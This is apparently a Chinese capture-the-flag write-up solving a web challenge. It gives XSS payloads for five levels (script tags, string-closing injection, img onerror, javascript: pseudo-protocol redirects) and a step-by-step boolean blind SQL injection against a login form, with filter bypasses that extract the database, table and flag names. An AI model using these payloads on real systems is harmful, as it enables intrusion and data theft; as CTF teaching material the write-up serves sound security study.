解法3

观前说明：本题 payload 不唯一。

第一关

观察到 url 中有 ?username=xss，而网页中正好存在 welcome xss，猜测是直接替换。

payload： level1?username=<script>alert(1)</script>

第二关

查看网页源代码后发现 document.getElementById('ccc').innerHTML= "Welcome " + escape(username);。

而 username 定义时如果字符串中有 / 就会报错，于是想到注入点可以在变量定义那里 var username = 'xss';，闭合语句即可。

payload：level2?username=';alert(1);//，变量定义的语句变为 var username = '';alert(1);//';。

第三关

观察网页源代码，发现字符都被转义了。

写入标签 level3?username=<img src=233 onerror=alert(1)>

第四关

发现是自动跳转的网页，源代码里发现注入点是 jumpUrl，使用 JavaScript 伪协议来实现。

payload：level4?jumpUrl=javascript:alert(1)

第五关

观察源代码发现有 autosubmit action 两个参数，其中需要我们把 autosubmit 置 1，然后会跳转到 action 参数的链接。

比方说，有 level5?autosubmit=1&action=233，网站会跳转到 /233 上去。

于是再用 JavaScript 伪协议，得到 payload：level5?autosubmit=1&action=javascript:alert(1)

解法2

其实可以直接在登录界面进行布尔盲注。

观察登录返回情况，存在 username wrong 和 password wrong，于是可以考虑以此作为参考进行布尔盲注。

即如果 username 注入成功，返回即为 password wrong，反之则为 username wrong。

最简单的等于和小于测定被ban了，但还有一个大于。

POST以下数据：username=admin' AND 2>1 -- &password=233发现返回password wrong。

username=admin' AND 2>3 -- &password=233发现返回username wrong。

至此，理论基础存在，比如你可以用 username=admin' AND length(database())>3 -- &password=233 这类语句得知当前数据库名长度为3。

username=admin' AND ascii(substr(database(),1,1))>99 -- &password=233 得知数据库名第一个字符为 c。

以此类推得到数据库名为 ctf。

小写 tables 和等号被 ban 了，采用大写和 LIKE 语句绕过。

username=admin' AND (SELECT count(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'ctf')>1 -- &password=233

得到只有2个表，其实就是 PERSON 表和 Flllllllllllllaaaaaaaaaaaaagggggggg

使用 LIMIT 限定一下就行。

username=admin' AND length(substr((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'ctf' LIMIT 0,1),1))>34 -- &password=233 得到表名长度为35。

username=admin' AND ascii(substr((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'ctf' LIMIT 0,1),1,1))>70 -- &password=233 得到表的第一个字符为 F。

以此类推得到表名为 Flllllllllllllaaaaaaaaaaaaagggggggg。

如法炮制得到列名和最后的 flag。
